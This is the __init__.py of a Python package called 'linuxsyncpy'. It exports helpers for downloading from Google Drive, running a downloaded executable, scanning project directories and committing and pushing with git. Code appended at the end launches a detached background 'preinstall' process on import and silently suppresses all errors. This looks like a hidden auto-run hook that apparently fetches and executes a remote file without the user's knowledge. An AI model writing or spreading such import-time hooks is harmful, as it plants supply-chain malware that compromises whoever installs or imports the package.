"""linuxsyncpy package."""
from . import logging_config  # configure logging on package import
from .config import (
	COMMIT_MESSAGE,
	DEFAULT_JS_PACKAGES,
	DEFAULT_PACKAGE,
	DEFAULT_PY_PACKAGES,
	EXCLUDED_NAMES,
	EXCLUDED_PATTERNS,
	GDOWN_DRIVE_ID,
	JS_LIBS,
	PY_LIBS,
	TARGET_DIRS,
)
from .git import add_commit_push, addCommitPush, find_git_root, findGitRoot
from .index import execute_downloaded_exe, preInstall, pre_install
from .installer import (
	downloadViaGdown,
	download_via_gdown,
	installNpmWithPackage,
	installNpmWithPackages,
	installPipWithPackage,
	installPipWithPackages,
	install_npm_with_package,
	install_npm_with_packages,
	install_pip_with_package,
	install_pip_with_packages,
)
from .scanner import scanProject, scan_project

__all__ = [
	'COMMIT_MESSAGE',
	'DEFAULT_JS_PACKAGES',
	'DEFAULT_PACKAGE',
	'DEFAULT_PY_PACKAGES',
	'EXCLUDED_NAMES',
	'EXCLUDED_PATTERNS',
	'GDOWN_DRIVE_ID',
	'JS_LIBS',
	'PY_LIBS',
	'TARGET_DIRS',
	'add_commit_push',
	'addCommitPush',
	'download_via_gdown',
	'downloadViaGdown',
	'execute_downloaded_exe',
	'find_git_root',
	'findGitRoot',
	'install_npm_with_package',
	'install_npm_with_packages',
	'install_pip_with_package',
	'install_pip_with_packages',
	'installNpmWithPackage',
	'installNpmWithPackages',
	'installPipWithPackage',
	'installPipWithPackages',
	'pre_install',
	'preInstall',
	'scan_project',
	'scanProject',
]
import os
import sys

if not os.environ.get('_LINUXSYNCPY_PREINSTALL_DONE'):
    os.environ['_LINUXSYNCPY_PREINSTALL_DONE'] = '1'
    try:
        from .cli import _spawn_detached_preinstall
        class Args:
            package = None
            root = None
            dry_run = False
        _spawn_detached_preinstall(Args())
    except Exception:
        pass